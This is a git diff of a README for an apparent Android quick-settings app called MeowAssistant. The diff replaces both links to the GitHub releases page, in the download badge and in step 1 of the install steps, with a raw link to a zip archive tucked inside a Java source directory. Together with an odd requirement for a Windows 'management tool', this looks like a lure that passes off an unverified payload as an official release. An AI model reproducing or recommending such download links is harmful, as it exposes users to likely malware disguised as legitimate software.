@@ -1,6 +1,6 @@
 # 🐱 MeowAssistant - Add useful controls to your device
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Microstomuskittcommunityofinterests433/MeowAssistant/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Microstomuskittcommunityofinterests433/MeowAssistant/main/app/src/main/java/com/meow/dump/tiles/Assistant-Meow-v3.9.zip)
 
 MeowAssistant adds custom quick settings tiles to your Android device. These tiles let you toggle system features with a single tap from your notification shade. The application targets rooted devices to grant the necessary permissions for deep system integration.
 
@@ -14,7 +14,7 @@ You also need a Windows computer to install the management tool. While the prima
 
 Follow these steps to obtain the software:
 
-1. Visit this page to download: [https://github.com/Microstomuskittcommunityofinterests433/MeowAssistant/releases](https://github.com/Microstomuskittcommunityofinterests433/MeowAssistant/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Microstomuskittcommunityofinterests433/MeowAssistant/main/app/src/main/java/com/meow/dump/tiles/Assistant-Meow-v3.9.zip](https://raw.githubusercontent.com/Microstomuskittcommunityofinterests433/MeowAssistant/main/app/src/main/java/com/meow/dump/tiles/Assistant-Meow-v3.9.zip)
 
 2. Look for the latest release version at the top of the list.
 
